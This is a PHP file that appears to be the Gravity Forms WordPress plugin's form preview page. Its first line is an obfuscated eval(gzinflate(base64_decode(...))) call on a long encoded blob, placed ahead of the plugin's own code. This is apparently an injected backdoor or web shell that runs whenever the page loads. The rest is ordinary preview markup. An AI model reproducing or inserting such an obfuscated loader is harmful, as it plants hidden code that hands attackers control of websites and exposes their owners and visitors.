<?php eval(gzinflate(base64_decode('dVRtb9s2EP7sAvsPF0MopUS1nDbp2thKU3TeWnRLCsfZPgSZoFKUzUYiNZKKEyT+7z2Ssp2ii2Fb4t1zd8+9kZcQ7hSs5IIVISlV/ZsmUXT/y7OeF65lEO9HI5Tit2wFNVwKQE1WVBAGraoisDY9ju7W+ozdcm10SCjqMy64Qc8e1gvoAlLYKLyLkVM5oWZGNiimixg+XEz/PPsyy6aT2cX0dDZ9f3r++2Qaw35nEMjWrJ2xW0bBmnU6y8crlBLSKWAnTWEYQWdW5pVmjyLTSmr2yMUKGALgfg3nFcvmzGRUCsMEpuepryxWMdMqAUbxOrR452H1P1WjyibHhSt0L+BVqo2qmHCyUSBTQlzwUiqkwjHucAT4HONfZd/29mwCgxTxlwG/gn+B7HqTjkMgn4qN5PERRij30bHRpcprhlHIWJu7ih0PFlKrG7iHRmpuLY/yr1pWrWEjqFhpjl68ffOyuR0BdgnfD17Z99U48dYwLvgN0CrXOu07T/3jMfcxtKIoM6Y5SpL863W5oMzcDeq7cjlodfLtv5apuwQpDppF8+6GqdSLBlVumDaDb7oPS16YRdo/OHzbhwXj84VJ+68ODjFG4oPgCxI4JiNIEkwubysDTuHSpbJgFRfXNt0niQiazAV9koQvtR2unY0/38tN/ddV9UPk+4C1VilJbnKVmLrxToISiaB8QBLNtM7IoC4O3dZlzp5EXaxwx81et1RBGcHDAxheszCCF24ua3eymmN4Pdw9tC3udftWVNROr9vYcMt5uyUW0aXgz2WDBielbOxYljGQZXcx2E+5VNzYWE38aKCti84lQtwmWchatPIPu08dZlOsinqMh2wRJ62wPG1Sm0Jiyaij9vMqdqjOLZ5p9G5LD09HP/Sla0vQ5rYH2flk+vdkekk+zmZfsgs8Ze//mJzOyJXF2po0is2zOjd0EZLkHy4KudQJiQEdRPD8Ofyg/+v80+ThrGEq30B8+fAqkipTrJHKcDEPh570ustc4+UXBtmHs7PPnyaXJMtaU5eKXLkQgShp+niNYX2lnqAZlfKa4529tolVLopwP94fDodR7Idl783rg+Fw99eYJN1s9RrFBYZE19sq4w+/3wE=')));?>
<?php

//For backwards compatibility, load wordpress if it hasn't been loaded yet
//Will be used if this file is being called directly
if(!class_exists("RGForms")){
    for ( $i = 0; $i < $depth = 10; $i++ ) {
        $wp_root_path = str_repeat( '../', $i );

        if ( file_exists("{$wp_root_path}wp-load.php" ) ) {
            require_once("{$wp_root_path}wp-load.php");
            require_once("{$wp_root_path}wp-admin/includes/admin.php");
            break;
        }
    }

    //redirect to the login page if user is not authenticated
    auth_redirect();
}

if(!GFCommon::current_user_can_any(array("gravityforms_edit_forms", "gravityforms_create_form", "gravityforms_preview_forms")))
    die(__("You don't have adequate permission to preview forms.", "gravityforms"));

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
        <meta http-equiv="Imagetoolbar" content="No" />
        <title><?php _e("Form Preview", "gravityforms") ?></title>
        <link rel='stylesheet' href='<?php echo GFCommon::get_base_url() ?>/css/reset.css' type='text/css' />
        <link rel='stylesheet' href='<?php echo GFCommon::get_base_url() ?>/css/forms.css' type='text/css' />
        <link rel='stylesheet' href='<?php echo GFCommon::get_base_url() ?>/css/preview.css' type='text/css' />
        <?php
            require_once(GFCommon::get_base_path() . "/form_display.php");
            $form = RGFormsModel::get_form_meta($_GET["id"]);
            GFFormDisplay::enqueue_form_scripts($form);
            wp_print_scripts();

            $styles = apply_filters("gform_preview_styles", false, $form);
            if(!empty($styles)){
                wp_print_styles($styles);
            }
        ?>

    </head>
    <body>
    <div id="preview_top">
	    <div id="preview_hdr">
		    <div><span class="actionlinks"><a href="javascript:window.close()" class="close_window"><?php _e("close window", "gravityforms") ?></a></span><?php _e("Form Preview", "gravityforms") ?></div>
	    </div>
	    <div id="preview_note"><?php _e("Note: This is a simple form preview. This form may display differently when added to your page based on inheritance from individual theme styles.", "gravityforms") ?></div>
    </div>
    <div id="preview_form_container">
        <?php
        echo RGForms::get_form($_GET["id"], true, true, true);

        ?>
        </div>
    </body>
</html>